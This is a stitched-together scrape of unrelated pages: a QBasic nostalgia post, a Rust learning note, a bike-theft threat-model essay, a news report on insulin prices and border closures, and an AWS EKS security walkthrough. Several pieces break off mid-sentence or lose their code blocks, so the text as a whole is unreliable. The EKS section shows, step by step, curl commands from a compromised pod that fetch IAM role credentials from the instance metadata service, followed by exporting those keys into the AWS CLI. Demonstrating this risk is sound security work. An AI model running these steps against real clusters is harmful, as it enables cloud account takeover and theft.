<p>My first attempt at this was named “CharnOS”, based on my internet alias at the time<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>. Really it was just a window manager, but I didn’t yet know the difference. All the “apps” were full screen and the cursor was operated using arrow keys — I <em>still</em> hadn’t worked out mouse support.</p>
<p><a href="https://peterdn.com/images/hello-qbasic-nostalgia/charnos.bas.gif">

</a>
</p>

<p>It was around this time that I found <a href="http://www.petesqbsite.com/">Pete’s QBasic Site</a> and the information, forums, and community within. This was a goldmine! I met a few people there and got to know them via MSN. Some of them effectively became my mentors. My rate of learning skyrocketed, and I got my hands on QBasic 7 which included library support for mouse input and the ability to compile to EXE, among other exciting features.</p>
<p>My operating system aspirations continued, now with mouse support. Version 2, renamed to “Nebula”, was the most complete. It featured moveable windows, various types of UI widget, and multi-user support. The visual style was borrowed from an aforementioned mentor’s own creation.</p>
<p><a href="https://peterdn.com/images/hello-qbasic-nostalgia/nebula1.bas.gif">
  <img src="https://peterdn.com/images/hello-qbasic-nostalgia/nebula1.bas.gif" width="640px" alt="Screen capture showing logging in to Nebula window manager, and running the jotter text editor app. It's reminiscent of Windows 9x and also very slow." title="">
</a>
</p>
<p>Following this, I began to discover more modern programming languages like C, C++, PHP, and C#. I began to recognise that I’d really hit the limits of QBasic and that my journey would have to continue on more modern platforms. The Win32 API would prove to heavily inspire version 3 of Nebula, which had a slightly more mature look. It got about this far before I abandoned it, and set my sights on other things.</p>
<p><a href="https://peterdn.com/images/hello-qbasic-nostalgia/nebula2.bas.gif">
  <img src="https://peterdn.com/images/hello-qbasic-nostalgia/nebula2.bas.gif" width="640px" alt="Screen capture showing Nebula window manager version 3, even more reminiscent of Windows 9x" title="">
</a>
</p>
<p>That said, I would still occasionally dip into QBasic—even years later—for fun graphical demos, like this fire simulation:</p>
<p><a href="https://peterdn.com/images/hello-qbasic-nostalgia/fire.bas.gif">
  <img src="https://peterdn.com/images/hello-qbasic-nostalgia/fire.bas.gif" width="480px" alt="Screen capture showing an animation of fire that starts at the bottom of the screen and slowly spreads upwards" title="">
</a>
</p>
<p>When I could make do with VGA graphics, QBasic was still the lowest code-to-pixel barrier of any of the programming languages I knew. And perhaps it still is. In how many other languages is it possible to set up a blank canvas and draw a pixel in literally only two lines of code?</p>
<pre><code>SCREEN 13

<h2 id="qbasic-as-a-learning-experience">QBasic as a learning experience</h2>
<p>If there’s a point to this post beyond self-indulgence, it might be to reflect on how QBasic fared as a learning experience for someone new to programming. I’m not saying we should consider encouraging beginners to take their first steps in <a href="https://www.dosbox.com/">DOSBox</a>—from which the world had arguably moved on, even at the point when I started—but maybe there are some aspects of the experience that we can learn from.</p>
<p>QBasic was a safe and accessible sandbox for beginner me to explore my creativity within. I’m sure there are modern alternatives that offer similar experiences, I just haven’t been on the lookout for them. It’s impossible for me to exactly re-envisage the perspective that started me on this journey 16 years ago. Sure, I still find coding and solving problems to be fun, but never in <em>quite</em> the same way as I did back then, when everything was new and exciting.</p>
<p>Convenience is a double-edged sword. The QBasic IDE hides a lot of complexity from the programmer. I didn’t need to worry about compiling, or linking, or the command-line in general. Double-clicking QBX.EXE would drop me instantly into the action, ready for me to just start writing and running code. The language itself is also purposefully, well, basic. There’s relatively little “structural syntax”, for lack of a better term, and the IDE even attempts to hide some of that. I think this was beneficial to begin with, but increased the learning curve when I eventually moved on to languages with a <em>lot</em> of structural syntax like C and C#. I still remember being utterly baffled by the arcane incantations of a C “hello, world”: what on Earth does any of <code> void main(int argc, char *argv[])</code> mean?!</p>
<p>These would have been learning curves no matter what, but I feel that delaying them until later meant I was able to make quicker progress. I would have been much less inclined to bash my head against walls like linker errors if I wasn’t already hooked. And of course, even if today’s mainstream languages might have a higher barrier to entry than in the past, this is offset by the convenience of finding help. Tutorials, documentation, books, Stack Overflow: there is so much more support available to beginners now.</p>
<p>What motivated me is certainly not going to apply to everyone. In hindsight, luckily, QBasic worked as my first programming language because it turned out I was motivated by the art of programming in itself, and at the beginning I just wanted to have fun. Had I instead wanted to create a website to share with people, or a mobile game to sell on the App Store, it would …</p></div></div>

<div>
<p>The Rust programming language has become a popular choice amongst software engineers since its release in 2010. Besides being something new and interesting, Rust promised to offer exceptional performance and reliability. In particular, Rust achieves memory-safety and thread-safety through its ownership model. Instead of runtime checks, this safety is assured at compile time by Rust's borrow checker. This prevents undefined behaviour such as dangling pointers!</p>
</div>
</div><div>

<div>
<div>
<p>I first encountered Rust sometime around 2015 when I was updating my teaching materials on memory management in C. A year later in 2016, I implemented a simple multi-objective evolutionary algorithm in Rust as an academic exercise (available: <a href="https://github.com/shahinrostami/simple_ea">https://github.com/shahinrostami/simple_ea</a>). I didn't have any formal training with Rust, nor did I complete any tutorial series, I just figured things out using the documentation as I progressed through my project.</p>
<p>Some example code from this project takes ZDT1 from its mathematical expression in Equation 1</p><p>
$$
\begin{aligned}
f_1(x_1) &amp;= x_1 \tag{1} \\
f_2(x) &amp;= g \cdot h \\
g(x_2,\ldots,x_{\mathrm{D}}) &amp;= 1 + 9 \cdot \sum_{d=2}^{\mathrm{D}} \frac{x_d}{(D-1)}\\
h(f_1,g) &amp;= 1 - \sqrt{f1/g}
\end{aligned}
$$</p><p>to the Rust implementation below.</p>

</div>
</div>
</div><div>

<div>
<div>
<p>It was interesting to see that since writing this code in 2016, some of my dependencies have been deprecated and replaced.</p>
<p>My greatest challenge was breaking away from what I already knew. Until this point, I was familiar with languages such as C, C++, C#, Java, Python, MATLAB, etc., with the majority of my time spent working with memory managed languages. I found myself resisting Rust's intended usage, and it is still something I'm working on.</p>
<p>Now that I am about to commence my sabbatical from my University post, I've decided to try Rust again. This time, I'm going to write a book which focusses on using Rust and Jupyter Notebooks to implemented algorithms and conducted experiments, most likely in the fields of search, optimisation, and machine learning. Can we write and execute all our code in a Jupyter Notebook? Yes! <em>Should</em> we? Probably not. However, I enjoy the workflow, and making this an enjoyable process is important to me.</p>

        <p id="article-description">How to avoid buying your bike again every 6-12
        months and tips for how to apply the same reasoning to other things, like
        computers</p>
        <hr>
        <figure>
            <img src="http://calpaterson.com/assets/solitary-wheel.jpeg" alt="a solitary wheel left behind after the rest of the bike was nicked">
            <figcaption>
                Rucksack Rupert strikes again
            </figcaption>
        </figure>
        <p>Some very commonly repeated advice on preventing someone from nicking your
        bike:</p>
        <blockquote>
            <p>Buy a good [~10% of bicycle value] lock, ideally one with a high
            "SoldSecure" rating and lock your bicycle somewhere inside the rear
            triangle and the rear wheel.</p>
        </blockquote>
        <p>I've seen this advice repeated in cycling magazines, in quality newspapers,
        sometimes even by the police and of course on internet forums.</p>
        <p>The above would imply that if you own a £400 bicycle (<a href="https://www.statista.com/statistics/395884/bicycle-average-prices-in-the-european-union-eu-by-country/">a
        typical price in the UK</a>) you'd buy a £40 lock and put it in the right
        place.</p>
        <p>However, it is a cold fact that a cordless angle grinder can defeat any
        bicycle lock, no matter how expensive (<a href="https://www.youtube.com/watch?v=pywN558dJaU&amp;t=198">see this video for a
        demonstration</a>). You can buy a used cordless angle grinder on eBay for less
        than £100. Even U-locks - traditionally thought to be the strongest type of
        lock - are opened in seconds with a sub-£100 angle grinder.</p>
        <p>There is other advice floating around of doubtful value, for example:</p>
        <blockquote>
            <p>Add your bicycle to a national register</p>
        </blockquote>
        <p>But cases where BikeRadar manage to reunite bicycles with their owners seem
        to be the exception rather than the rule. Probably this is because, as with
        cars, the first thing you do with a stolen bicycle is take it across a border
        to somewhere different.</p>
        <blockquote>
            <p>Lock your bicycle inside a secure building or place, away from sight</p>
        </blockquote>
        <p>This prevents opportunistic theft but if this space is shared with others
        (apartment blocks and offices) it in fact serves to increase the economies of
        scale for prepared thieves who break into your storage area late at night with
        a van. It's not uncommon for office bicycle stores (with many fancy, expensive
        bikes inside) to be emptied out completely overnight by professional
        thieves.</p>
        <h2>A threat model, by user persona</h2>
        <p>I think the advice above is poor because it doesn't come from a systematic
        consideration of the problem <em>from the point of view of thieves</em>.</p>
        <p>To come up with better advice requires a threat model, which is a piece of
        jargon for taking a holistic view of the danger posed by attackers. I think one
        of the simplest and most straightforward ways to do threat modelling is by
        <em>user persona</em>, whereby you consider each kind of attacker in turn,
        making some reasonable assumptions about their level of motivation and
        methods.</p>
        <p>As far as bicycle theft is concerned there are three basic types of
        thief.</p>
        <h3>"No-tools Nigel", the rank opportunist</h3>
        <p>Nigel has just his two hands and is simply looking for a ride home or maybe
        something he can sell to a friend for some quick cash.</p>
        <p>Nigel will steal any unlocked bicycle.</p>
        <p>Nigel is also able to take any bicycle parts that can be removed without
        tools. That means any quick-release wheels or thumbscrew saddles. In an urban
        area your parked bicycle may be passed by a Nigel as often as a few times an
        hour so anything that is not bolted down won't last very long.</p>
        <h3>"Rucksack Rupert", the thief with a few hand tools</h3>
        <p>Rupert has a small pair of shears; 4, 5 and 6mm Allen keys and a 15mm
        spanner for wheel nuts.</p>
        <p>Rupert will make his way through cable locks with his shears. If there is a
        valuable part that can be removed with hand tools he will take it. He is
        particularly keen on premium saddles and name brand wheels.</p>
        <h3>"Powertool Percy", the professional with a complete set of tools</h3>
        <p>Percy has a small collection of electric and air tools including an angle
        grinder as well as bolt-cutters and an air-jack. He has access to <a href="https://en.wikipedia.org/wiki/Fence_(criminal)">criminal fences</a> which he
        can use to sell stolen bicycles quickly. Percy often arrives in his van and
        this allows him to steal multiple bikes at once.</p>
        <p>No bicycle is safe from Percy. No lock can hold against his angle grinder.
        Often he finds if he's wearing a hi-vis jacket he can even get away with using
        his power tools in broad daylight. He's willing to chance that if the bicycle
        seems valuable enough.</p>
        <h2>Coming up with better advice based on Nigel, Rupert and Percy</h2>
        <p>In order to keep your bicycle safe you need to take steps against all three
        levels of imaginary thieves.</p>
        <p>"No-tools Nigel" will be warded off simply by:</p>
        <ul>
            <li>Locking your bicycle whenever you leave it - even if just for a
            minute</li>
            <li>Ensuring you leave nothing on your bicycle that can be removed without
            tools
                <ul>
                    <li>replace quick-release wheel skewers with bolts</li>
                    <li>take your lights with you when you park in public</li>
                    <li>make sure your saddle is not on a thumbscrew</li>
                </ul>
            </li>
        </ul>
        <p>"Rucksack Rupert" will be deterred by:</p>
        <ul>
            <li>Not using a cable lock!</li>
            <li>Making sure that nothing good can be removed from your bicycle with
            hand tools
                <ul>
                    <li>Lock both wheels <em>and the frame</em> to the bike stand -
                    don't rely on bolts</li>
                </ul>
            </li>
        </ul>
        <p>"Powertool Percy" will be kept at bay by:</p>
        <ul>
            <li>Nothing, save ensuring that your bicycle doesn't look valuable enough
            to be worth his time
                <ul>
                    <li>this probably means keeping its value down below a few hundred
                    pounds</li>
                </ul>
            </li>
        </ul>
        <h2>The virtue of the "bicycle shaped object"</h2>
        <p>Valuable bicycles (&gt;£1000) have an extremely short half-life in urban
        areas. The sad truth is that the Percys of the world are common enough and
        resourceful enough that a bicycle worth over a thousand pounds isn't really
        safe anywhere in a large town. <strong>This includes most e-bikes.</strong> You
        might notice that cycle couriers who have e-bikes tend to eat lunch while
        looking directly at their locked e-bike, so that it never goes out of their
        sight. Few people in other lines of work can do the same.</p>
        <p>If the tyres are inflated, my own commuter bicycle is probably worth £30 to
        the right buyer. My bicycle is so low-end that cycling snobs refer to it as a
        mere "bicycle shaped object". Rather selfishly I am glad that such snobs exist
        as having a lot of more valuable bicycles around provides me with good ambient
        security. No thief is going to bother cutting my locks when there is a
        Campagnolo on the next rack.</p>
        <p>One father I know had his primary-school-age daughter "decorate" his
        commuting bicycle with girly stickers and pink glitter. If anyone examines his
        bicycle closely he looks like a complete loon but I think his motivation is
        right: it's going to be much less appealing to steal when it's covered in Miffy
        stickers.</p>
        <h3>Insurance - not usually worth it</h3>
        <p>What about bicycle insurance? It's fairly expensive here in the UK, usually
        10-15% of the bicycle's value annually and insurers typically only pay out when
        the whole bicycle is taken (so if if your front wheel is nicked, you're on your
        own) and when you can demonstrate that it was locked to their standards. Often
        these standards require that it is locked up indoors which means you're
        chancing it whenever you park away from your home or office.</p>
        <h2>Lists of "best practices" vs having your own threat model</h2>
        <p>The same thing goes for securing your bicycle as for securing other things:
        pat, concrete pieces of security advice are something to treat with a bit of
        doubt.</p>
        <p>In bicycles the common mantra is "spend 10% on a lock" but in computing the
        mantras are slogans such as "use a strong password", "back up your important
        data" or "use encryption" but these can all be just as vapid.</p>
        <p>"Strong passwords!" as a slogan fails to address the fact that the average
        internet user has hundreds of logins for various sites (my own password manager
        has over 700 sites recorded). The majority of internet users decide on a single
        "strong password" and then use it everywhere. They are only a single bad
        sysadmin or javascript injection away from losing access to every account on
        every website they have.</p>
        <p>Backing up your important data is only an aid to your security if the backup
        is stored as securely as the original. Much user data is stolen or exposed
        through poorly secured backups on shared fileservers. A huge number of people
        have passport and utility bill scans in their Dropbox - again, behind the same
        email and password they use everywhere. Companies can be surprisingly sloppy
        with backups too: often dumped into cloud storage somewhere once before the Big
        Migration and never removed.</p>
        <p>Encryption is troublesome as it can give undue confidence that can backfire
        spectacularly: a quarter of a million American diplomatic cables were
        inadvertantly published in unredacted form when a Guardian journalist <a href="https://en.wikipedia.org/wiki/WikiLeaks:_Inside_Julian_Assange%27s_War_on_Secrecy">
        included the password for an widely-distributed encrypted file in his book</a>.

            <p>
	"Want to hear the joke about insulin?" goes the bleak gag about America's drug prices. "You have to go to Canada to get it."</p>
<p>
	But even that's not an option anymore.</p>
<p>
	Pandemic travel restrictions have made Americans prisoners of their country. Even within North America, Mexico and Canada have closed thousands of kilometres of border to all but essential travel, roiling plans for vacation, work, and school. For cash-strapped Americans, it has also cut off access to medicines and health-care services that they can't afford at home -- at a time when money is tighter than ever.</p>
<p>
	Stephanie Boland's nine-year-old son was diagnosed with diabetes in December. Travelling to Canada to fill his insulin prescription took a half-day's drive from where they live in Brainerd, Minnesota, but it was worth it -- the purchase was a simple, over-the-counter affair. One pack of injection pens, which would last several months, cost less than a hundred dollars, she says, compared to <a href="https://www.lillypricinginfo.com/humalog" target="_blank">a list price of $530 at home. </a></p>
<p>
	As their son's disease began to rewrite the routines of daily life, the Bolands planned to cross into Canada again to restock. Then the pandemic hit.</p>
<p>
	Boland, a masseuse, was forced to stop working. Her husband, a self-employed financial adviser, found his income hit by pandemic-related turbulence in the markets, too. Then their source for affordable insulin vanished behind <a href="https://edition.cnn.com/2020/03/19/opinions/canada-us-border-coronavirus-bociurkiw/index.html" target="_blank">a border that had never been closed before</a> in the history of <a href="https://theconversation.com/shuttered-canada-us-border-highlights-different-approaches-to-the-pandemic-and-differences-between-the-2-countries-137848" target="_blank">U.S.-Canada relations</a>.</p>
<p>
	"We were going to make a trip north, one more trip in March, but then they closed the border," she said.</p>
<h3>
	BUYING INSULIN ABROAD</h3>
<p>
	Only 1.5% of American adults who take prescription medications buy their drugs abroad, according to a June analysis by researchers at the University of Florida Gainesville, based on a 2015-2017 National Health Interview Survey.</p>
<p>
	But that's still <a href="https://jamanetwork.com/journals/jamanetworkopen/fullarticle/2767592?resultClick=3" target="_blank">an estimated 2.3 million people</a>.</p>
<p>
	Many medicines and medical services are cheaper in neighbouring Canada and Mexico, thanks to price controls and <a href="https://www.oecd.org/mexico/38097348.pdf" target="_blank">the power of the U.S. dollar</a>. The difference is great enough that U.S. insurer PEHP, which covers Utah's state employees, offers partially paid trips to Vancouver and Tijuana "<a href="https://www.pehp.org/pharmacy/tourism" target="_blank">to help you save money on your prescriptions</a>."</p>
<p>
	In popular Mexican resort towns like Cabo San Lucas on the West Coast, or Tulum on the East Coast, pharmacies, doctors and dentists targeting U.S. clientele dot the main drag, their prices on bright display. And the difference between those prices and the costs of the same drugs at U.S. pharmacies can mean life or death.</p>
<p>
	No drug is a better-known example of that calculus than insulin, a vital hormone in the body's metabolism. Seven million American diabetics don't produce it naturally -- or not enough of it -- and need to inject it throughout the day. Without it, dangerous levels of glucose build up in the blood, damaging organs and producing a painful stupor. In a worst case scenario, lack of insulin can kill within three days.</p>
<p>
	Americans have been going to Canada for insulin since scientists learned how to produce it in labs at the University of Toronto in 1921. One of the first patients to try it was an American: Elizabeth Hughes, the teenage daughter of then-U.S. Secretary of State Charles Evans Hughes.</p>
<p>
	"I'm so happy and elated," <a href="https://insulin.library.utoronto.ca/islandora/object/insulin%3AL10111" target="_blank">she wrote</a> in a letter to her mother from Canada, describing her first self-injection and the "enormous" meal she enjoyed afterward. Before crossing the border, the 15-year-old had managed her condition by starving herself -- the only life-prolonging trick available to diabetics before insulin. Five feet tall, she weighed only <a href="https://insulin.library.utoronto.ca/islandora/object/insulin%3AW10006" target="_blank">45 pounds.</a></p>
<p>
	A hundred years later, and after <a href="https://edition.cnn.com/2020/02/08/us/states-passing-bills-insulin-insurance-copay-trnd/index.html" target="_blank">national soul-searching</a> over the soaring cost of insulin, some Americans are still starving themselves. Daniel Carlisle, a Type 1 diabetic in Texas, has sometimes tried not to eat for days at a time, in an attempt to ration insulin. When he was 18 and short on cash, he even contemplated robbing a pharmacy, he says.</p>
<p>
	"I always do the math about how many days' supply of insulin I have in the refrigerator," the 60-year-old Texan says.</p>
<p>
	"That's how I know my lifespan at that point. My lifespan is measured in exactly how many days' worth of insulin I have in hand -- plus three days."</p>
<h3>
	NUEVO PROGRESO</h3>
<p>
	For the past three years, buying insulin in Mexico has brought Carlisle security.</p>
<p>
	His trips started with a split tooth in 2017. "I went to a dentist near where I live, and he said he could repair it for like $10,000," says Carlisle, who is uninsured. "So I told him, 'Look I can't afford to send my kids to Harvard. Sure can't afford to send yours."</p>
<p>
	He tried to ignore his aching tooth, but at the urging of his family, eventually drove several hundred kilometres south from his home in Houston to the busy Mexican town of Nuevo Progreso.</p>
<p>
	"As soon as you come across the bridges, hawkers are saying "Need a dentist? Need a pharmacy? It's just constant," he says. First he got his tooth fixed -- a root canal, bridge and crown altogether would end up costing him just $750. "The dentists aren't marble palaces, but they're clean," he says.</p>
<p>
	Then he dipped into a pharmacy to ask the price of a vial of Humalog insulin, one of two kinds he takes. The answer: US$70. He checked the expiration date on the box, and then offered $20.</p>
<p>
	"You've got to negotiate!" he says. "I just tell them I'll die without it and then they'll lose a customer. They don't put up a fuss."</p>
<p>
	A vial of the same insulin in the U.S. has a list price of $274.70.</p>
<p>
	Since then, that's the only place where he buys insulin, Carlisle says, and he's never had a problem with its quality. But with the borders closed, he doesn't expect be back any time soon.</p>
<h3>
	A VAST GREY AREA</h3>
<p>
	Pharmacy staff in several drugstores in border towns in both Canada and Mexico tell CNN that they've seen significant drops in foot traffic since their countries' borders with the U.S. closed. Though American scofflaws have been accused of crossing into Mexico for nonessential errands, overall border crossings <a href="https://explore.dot.gov/views/BorderCrossingData/Monthly?:embed=y&amp;:isGuestRedirectFromVizportal=y&amp;:display_count=n&amp;:showVizHome=n&amp;:origin=viz_share_link" target="_blank">have plummeted</a>.</p>
<p>
	One young man working at a pharmacy near Tijuana told CNN that business had fallen about 40% since the border closed. He asked to remain anonymous because he was not authorized to speak about the business.</p>
<p>
	Technically, bringing prescription drugs into the U.S. is illegal. But the U.S. Food and Drug Administration (FDA) has created <a href="https://urldefense.proofpoint.com/v2/url?u=https-3A__www.fda.gov_industry_import-2Dbasics_personal-2Dimportation&amp;d=DwMGaQ&amp;c=tq9bLrSQ8zIr87VusnUS9yAL0Jw_xnDiPuZjNR4EDIQ&amp;r=rCHQaNbjPpivEAmu6NC2SN5wUrEBtRzWRu-4Q4NII98&amp;m=WQfC6uO0pwOxMMVHYr1M2sV1Imudp8inpPiV52_rqCQ&amp;s=rhQ5OrNJsHfUWt-LO0TyUzEZRLTw60VpuTji1hJpH7k&amp;e=" target="_blank">a grey area</a> for small amounts: Importation "might" be allowed, according to the agency's website, if the medicine doesn't exceed a three month supply.</p>
<p>
	Staff at Mark's Marine Pharmacy in Vancouver, Canada, less than an hour's drive from the U.S. border, typically fill hundreds of orders for U.S. customers each day, general manager Jordan Rosenblatt says, and rarely have any problem shipping it. With the borders closed, online ordering has spiked, he adds.</p>
<p>
	Reviews over the years on their Facebook page compare prices of all kinds of prescription drugs to those in the U.S., with commenters from as far as New Jersey and Texas. "They sell and send me my asthma inhalers at a price that is non-predatory, unlike here in the U.S. Happiest gal today! Thank you!" reads one.</p>
<p>
	But ordering online isn't for everyone -- there is always a risk that the medicine will be confiscated or that temperature-sensitive drugs like insulin could go bad waiting at customs or in U.S. Postal Service delays.</p>
<p>
	And as the frustrations of border closures highlight, foreign health systems make a poor fallback no matter how you access them.</p>
<p>
	"For any given individual in the short run, going to Canada is a decent solution, but it's not a systemic solution," says Dr. Vikas Saini, a Harvard-trained cardiologist and president of the<a href="https://lowninstitute.org/" target="_blank"> Lown Institute</a>, a nonpartisan health-care think tank.</p>
<p>
	U.S. President Donald Trump has called to allow larger scale importation from Canada, among <a href="https://edition.cnn.com/2020/08/22/politics/trump-drug-prices-fact-check/index.html" target="_blank">a raft of recent proposals</a> to reduce the prices of certain U.S. drugs. But that's unlikely to make a dent in the U.S. market, Saini says: "Canada is a country of about 30 million people. It doesn't have enough medication to provide all those prescriptions for the U.S. -- a nation 10 times the size."</p>
<p>
	Some <a href="https://www.cbc.ca/news/business/drug-exports-us-1.5236532" target="_blank">Canadian health industry groups</a> and patients agree. Since 2019, they've warned that Trump's importation plan could lead to <a href="https://www.cbc.ca/news/canada/toronto/american-demand-canada-drug-supply-1.5226871" target="_blank">drug shortages</a> for Canadians -- a fear likely sharpened after witnessing global shortages of vital medical equipment in the early months of the COVID-19 pandemic.</p>
<h3>
	A CRUMBLING ECONOMY</h3>
<p>
	As the pandemic wears on, the options are dwindling for Americans who can't afford to be sick in the United States -- especially after the cratering economy erased<a href="https://edition.cnn.com/2020/08/07/economy/july-2020-jobs-report/index.html" target="_blank"> nearly 13 million</a> jobs, taking health insurance options with them.</p>
<p>
	Even <a href="https://www.cbc.ca/news/world/u-s-canada-drug-prices-1.5552463" target="_blank">at Canadian prices</a>, some are struggling to pay for their prescriptions. "Recently, we're hearing about all the financial issues of people laid off," says Rosenblatt, the Vancouver pharmacy manager. "We have American customers that have been working with us for years, and under these circumstances, we've sent what they needed and we tell them, 'Pay us when you can.'"</p>
<p>
	To make insulin more accessible, some U.S. states have pushed for price caps on copays. The three companies which <a href="https://www.accessdata.fda.gov/scripts/cder/daf/index.cfm?event=BasicSearch.process" target="_blank">control the U.S. insulin market</a> offer discount plans, including <a href="https://www.novonordisk-us.com/media/news-releases.html?122988" target="_blank">new programs</a> to which Americans who were financially impacted by the pandemic can apply for temporary access to cheaper or free insulin. And Walmart offers cheap insulin over the counter (though this is an older formulation that can make blood sugar management more complicated than newer, prescription versions.)</p>
<p>
	Yet many are still struggling -- and not just the <a href="https://www.kff.org/uninsured/issue-brief/key-facts-about-the-uninsured-population/" target="_blank">nearly 28 million Americans</a> who don't have health insurance, a number estimated by the Kaiser Family Foundation. Even Americans with health insurance, who benefit from negotiated prices that are lower than the list prices, sometimes <a href="https://edition.cnn.com/videos/health/2020/04/29/go-there-insulin-high-cost.cnn" target="_blank">still can't afford</a> all the costs of living with diabetes.</p>

<p>In this post, we discuss the risks of the AWS Instance Metadata service in AWS Elastic Kubernetes Service (EKS) clusters. In particular, we demonstrate that compromising a pod in the cluster can have disastrous consequences on resources in the AWS account if access to the Instance Metadata service is not explicitly blocked.</p>



<hr>




<h2><span id="Introduction">Introduction</span></h2>



<p>For the purposes of this post, we’ll use an EKS cluster running Kubernetes v1.17.9 and created with <a href="https://eksctl.io/">eksctl</a>. We could also have created the cluster using Terraform or CloudFormation.</p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">eksctl create cluster \ 
  --nodes 1 \ 
  --name christophe-cluster \ 
  --node-type t3.large</pre>



<p>Once we created the cluster, we can use the AWS CLI to update our kubectl configuration file for us and start interacting with the Kubernetes API right away.</p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ aws eks update-kubeconfig --name christophe-cluster
Added new context arn:aws:eks:eu-central-1:account-id:cluster/christophe-cluster to /home/christophetd/.kube/config</pre>



<h2><span id="It_all_starts_with_a_compromised_Pod8230">It all starts with a compromised Pod…</span></h2>



<p>Let’s assume an attacker compromised a pod in the cluster, for instance by exploiting a vulnerability in the web application it was running. We simulate this scenario by running a pod and attaching to a shell inside it.</p>



<pre data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ kubectl run --rm -i --tty mypod --image=alpine --restart=Never -- sh

(pod)$ hostname
mypod</pre>



<p>Good! As an attacker, we’re now interested to enumerate resources in the cluster and in the associated AWS account. For completeness, we can have a look at the ATT&amp;CK-like threat matrix for Kubernetes by <a href="https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/">Microsoft</a>:</p>



<figure><img src="https://www.microsoft.com/security/blog/wp-content/uploads/2020/04/k8s-matrix.png" alt=""></figure>



<p>In the rest of this post, we’ll take a look at how the AWS Instance Metadata API (circled in green) <a href="https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/">strikes again</a> and allows us to do interesting things.</p>



<figure><img src="https://blog.christophetd.fr/wp-content/uploads/2020/08/k8s-matrix-annotated.png" alt="" srcset="https://blog.christophetd.fr/wp-content/uploads/2020/08/k8s-matrix-annotated.png 927w, https://blog.christophetd.fr/wp-content/uploads/2020/08/k8s-matrix-annotated-300x161.png 300w, https://blog.christophetd.fr/wp-content/uploads/2020/08/k8s-matrix-annotated-768x411.png 768w" sizes="(max-width: 927px) 100vw, 927px"></figure>



<h2><span id="A_refresher_on_the_AWS_Instance_Metadata_service">A refresher on the AWS Instance Metadata service</span></h2>



<p>As a reminder, the <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html">Instance Metadata service</a> is an AWS API listening on a link-local IP address, 169.254.169.254. It is only accessible from EC2 instances and allows to retrieve various information about them. </p>



<p>It is particularly useful when you need your instances to access AWS resources. Instead of hard-coding credentials, you first assign an IAM role to your instance. From the instance, you can then retrieve temporary credentials for the role. This is 100 % transparent if you use the AWS CLI.</p>



<h2><span id="Accessing_the_Instance_Metadata_service_from_a_compromised_pod">Accessing the Instance Metadata service from a compromised pod</span></h2>



<p>At first sight, it’s unclear what would happen if we were to query the Instance Metadata service from a compromised pod – so let’s give it a try.</p>



<pre data-enlighter-language="shell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">(pod)$ curl http://169.254.169.254/latest/meta-data/                                                                                                                                             
ami-id                                                                                                                                                                                        
ami-launch-index
...
security-groups</pre>



<p>Good. What’s the context of the data returned?</p>



<pre data-enlighter-language="shell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">(pod)$ curl http://169.254.169.254/latest/meta-data/iam/info

  "InstanceProfileId" : "AIPA..."
}</pre>



<p>Interestingly enough, we see that we can access the Instance Metadata service and that we’re able to retrieve temporary credentials for the IAM role <em>christophe-cluster-nodegroup-ng-15050c0b-<strong>NodeInstanceProfile</strong>-1AS40JWHFGXJ2</em>. </p>



<pre data-enlighter-language="shell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">(pod)$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/eksctl-christophe-cluster-nodegro-NodeInstanceRole-1XY9GXQ417J7H

}
</pre>



<p>This is the IAM role assigned to the EC2 instances acting as Kubernetes worker nodes! What can we do with it?</p>



<h2><span id="Least_privilege_you_say">Least privilege, you say?</span></h2>



<p>This role is <a href="https://docs.aws.amazon.com/eks/latest/userguide/worker_node_IAM_role.html">documented</a> by AWS, and we can see it’s attached to the following AWS managed policies:</p>



<figure><img src="https://blog.christophetd.fr/wp-content/uploads/2020/08/image.png" alt="" srcset="https://blog.christophetd.fr/wp-content/uploads/2020/08/image.png 749w, https://blog.christophetd.fr/wp-content/uploads/2020/08/image-300x102.png 300w" sizes="(max-width: 749px) 100vw, 749px"></figure>



<p>I’ve seen <a href="https://twitter.com/0xdabbad00/status/998978082466758661?lang=en">Scott Piper</a> regularly rant about AWS managed policies, arguing they are too privileged. Are they?</p>

<p>Outch. Does that look bad? It’s because it is. Let’s see what these permissions allow us to do.</p>



<p>We can install the AWS CLI locally and set the credentials we retrieved earlier from the Instance Metadata service.</p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ export AWS_ACCESS_KEY_ID=ASIA...
$ export AWS_SECRET_ACCESS_KEY=Xm/..
$ export AWS_SESSION_TOKEN=IQo...
$ aws sts get-caller-identity
{
    "UserId": "A...Q:i-02f...",
    "Account": "account-id",
    "Arn": "arn:aws:sts::account-id:assumed-role/eksctl-christophe-cluster-nodegro-NodeInstanceRole-1XY9GXQ417J7H/i-02..."
}</pre>



<p>Then, here are some examples of bad things we can do.</p>



